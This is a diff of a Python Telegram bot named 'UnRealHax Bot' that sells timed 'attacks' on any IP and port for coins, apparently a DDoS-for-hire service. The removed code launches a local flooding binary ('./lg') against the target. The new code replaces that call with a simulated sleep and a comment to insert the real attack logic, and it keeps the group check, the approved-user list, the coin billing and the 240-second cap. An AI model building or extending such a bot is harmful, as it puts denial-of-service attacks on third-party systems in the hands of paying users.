@@ -74,8 +74,8 @@ async def start(update: Update, context: CallbackContext):
         "🔥 Welcome to the UnRealHax Bot 🔥\n\n"
         "Commands:\n"
         "/attack <ip> <port> <duration> - Launch an attack\n"
-        "/account - Check your coins\n"
-        "/logs - View your attack logs\n"
+        "/myaccount - Check your coins\n"
+        "/history - View your attack logs\n"
     )
     await update.message.reply_text(message)
 
@@ -170,18 +170,13 @@ async def history(update: Update, context: CallbackContext):
         await update.message.reply_text("⚠️ No logs found.")
 
 async def attack(update: Update, context: CallbackContext):
-    if not is_group_chat(update):
+    global attack_in_progress
+
+    if update.effective_chat.id != ALLOWED_GROUP_ID:
         await update.message.reply_text("⚠️ This bot can only be used in the specified group.")
         return
 
-    # Existing logic for attack command
-
-    global attack_in_progress
-
-    chat_id = update.effective_chat.id
     user_id = str(update.effective_user.id)
-    args = context.args
-
     if user_id not in users:
         await update.message.reply_text("⚠️ You need approval to use this bot.")
         return
@@ -190,6 +185,7 @@ async def attack(update: Update, context: CallbackContext):
         await update.message.reply_text("⚠️ Another attack is in progress. Please wait for it to finish.")
         return
 
+    args = context.args
     if len(args) != 3:
         await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
         return
@@ -197,14 +193,12 @@ async def attack(update: Update, context: CallbackContext):
     ip, port, duration = args
     try:
         duration = int(duration)
+        if duration > 240:  # Limit the maximum attack duration
+            await update.message.reply_text("⚠️ Maximum attack duration is 240 seconds.")
+            return
     except ValueError:
         await update.message.reply_text("⚠️ Duration must be an integer.")
         return
-    
-    if duration > 240:
-        await update.message.reply_text("⚠️ Maximum attack duration is 240 seconds.")
-        return
-
 
     user_coins = coins.get(user_id, 0)
     if user_coins < duration:
@@ -218,42 +212,21 @@ async def attack(update: Update, context: CallbackContext):
 
     await update.message.reply_text(f"⚔️ Attack launched on {ip}:{port} for {duration} seconds. Please wait until it completes.")
 
-    # Offload the attack to a background task
-    context.application.create_task(run_attack(ip, port, duration, update, context))
+    # Run the attack in a background task
+    asyncio.create_task(run_attack(ip, port, duration, update))
 
-async def run_attack(ip: str, port: str, duration: int, update: Update, context: CallbackContext):
+
+async def run_attack(ip: str, port: str, duration: int, update: Update):
     global attack_in_progress
     try:
-        # Run the binary file
-        process = subprocess.Popen(
-            [f"./lg", ip, port, str(duration), "900"],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
-        )
-
-        # Wait for the process to complete asynchronously
-        while process.poll() is None:
-            await asyncio.sleep(1)
-
-        # Capture output and errors
-        stdout, stderr = process.communicate()
-        if process.returncode == 0:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text=f"✅ Attack completed successfully!"
-            )
-        else:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text=f"⚠️ Attack failed! Error: {stderr.decode().strip()}"
-            )
+        # Simulate the attack (replace with actual attack logic)
+        await asyncio.sleep(duration)
+        await update.message.reply_text(f"✅ Attack on {ip}:{port} completed!")
     except Exception as e:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text=f"⚠️ An error occurred: {str(e)}"
-        )
+        await update.message.reply_text(f"⚠️ An error occurred during the attack: {e}")
     finally:
         attack_in_progress = False
+
 
 # Main function
 def main():
